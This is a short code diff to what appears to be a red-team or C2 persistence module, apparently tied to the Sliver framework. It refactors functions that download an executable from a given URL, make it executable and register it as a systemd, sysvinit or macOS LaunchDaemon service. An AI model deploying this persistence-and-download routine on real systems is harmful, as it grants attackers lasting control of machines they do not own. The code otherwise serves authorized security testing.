@@ -164,7 +164,7 @@ def systemd(service_name, service_desc, executable_path, executable_url):
     file.remove("/tmp/systemd.service.j2")
 
     # assets.copy("persist_service/files/payload.elf", executable_path)
-    file.download(executable_url, executable_path)
+    http.download(executable_url, executable_path)
     sys.shell("chmod +x "+executable_path)
 
     sys.shell("systemctl daemon-reload "+service_name)
@@ -184,7 +184,7 @@ def sysvinit(service_name, service_desc, executable_path, executable_url):
     sys.shell("chmod +x "+"/etc/init.d/"+service_name)
 
     # assets.copy("persist_service/files/payload.elf", executable_path)
-    file.download(executable_url, executable_path)
+    http.download(executable_url, executable_path)
     sys.shell("chmod +x "+executable_path)
 
     sys.shell("update-rc.d "+service_name+" defaults")
@@ -201,7 +201,7 @@ def launch_daemon(service_name, executable_path, executable_url):
     file.remove("/tmp/plist.j2")
 
     # assets.copy("persist_service/files/payload.macho", executable_path)
-    file.download(executable_url, executable_path)
+    http.download(executable_url, executable_path)
     sys.shell("chmod +x "+executable_path)
     sys.shell("launchctl load -w /Library/LaunchDaemons/sliver.plist")
 
@@ -216,7 +216,7 @@ def persist_service(service_name, service_desc, executable_name, executable_url)
         executable_path = "/var/root/"+executable_name
         launch_daemon(service_name, executable_path, executable_url)
     else:
-        print("OS not supported\n")
+        eprint("OS not supported")
 
 persist_service(
     input_params['service_name'],
@@ -224,5 +224,4 @@ persist_service(
     input_params['executable_name'],
     input_params['executable_url']
 )
-print("\n")
-print("\n")
+print("")
